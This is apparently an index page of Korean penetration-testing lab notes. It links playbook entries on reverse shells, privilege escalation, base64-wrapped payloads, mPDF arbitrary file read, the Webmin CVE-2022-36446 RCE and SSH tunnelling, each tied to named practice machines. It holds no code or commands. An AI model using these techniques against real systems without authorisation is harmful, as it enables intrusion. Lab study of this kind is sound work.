- [[_PLAYBOOK#A-15. 302 여도 본문이 있다 / 블랙리스트가 302 를 오판한다]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#A-63. 익스플로잇은 통했는데 «무엇을 보냈는지» 기록이 없다]] · [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]]
- 「응답이 성공을 뜻하지 않는다」(302 + 경고 본문 = 거부 신호) — [[Crane]] · [[Squid]] · [[RubyDome]]
- 「버전 판정은 독립 근거 2개」(응답 헤더 + PDF `/Producer`) — [[Hub]] · [[Levram]]
- [[_PLAYBOOK#A-1-17. nmap 이 `filtered` 라고 적은 포트를 버렸다]] · [[_PLAYBOOK#A-2-15. 파일 읽기는 통했는데 «출력이 안 보인다»]] · [[_PLAYBOOK#A-66. 조건을 바꾸는데 응답이 한 글자도 안 변한다]]
- [[_PLAYBOOK#B-1-23. 문서 변환기(HTML→PDF)는 서버측 파서다 — mPDF `<annotation>` 임의 파일 읽기]] · [[_PLAYBOOK#B-1-24. Webmin package-updates 인증 후 RCE — CVE-2022-36446]] · [[_PLAYBOOK#B-71. 내부에만 열린 서비스는 SSH `-L` 로 끌어온다]]
- 「인용이 깨지면 인코딩으로 도망간다」(여기서는 `/` 잘림 → base64) — [[Hawat]] · [[Exfiltrated]] · [[Squid]]
- [[_STATUS]] — 283개 전수 진행현황
